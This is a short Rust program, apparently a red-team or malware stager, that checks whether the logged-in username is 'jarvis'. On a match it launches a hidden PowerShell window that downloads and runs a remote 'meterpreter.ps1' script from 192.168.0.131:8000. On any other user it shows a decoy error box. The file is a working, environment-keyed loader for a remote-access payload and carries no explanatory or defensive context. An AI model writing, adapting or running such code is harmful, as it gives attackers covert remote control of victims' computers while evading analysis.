use whoami;
use msgbox;
use std::process::*;

fn keyedByUserName(){
    let userName = whoami::username();
    if userName == "jarvis"
    {
        //println!("Username checks out!");
        Command::new("powershell").arg("-NoExit ").args(&["-WindowStyle","Hidden"]).args(&["iex(iwr","-useb","http://192.168.0.131:8000/meterpreter.ps1)"]).spawn().expect("failed to execute process");
    }
    else
    {
        msgbox::create("Error", "username does not match keyed value",msgbox::IconType::Info).expect("error");
    }
}

fn main() {
    keyedByUserName();
}
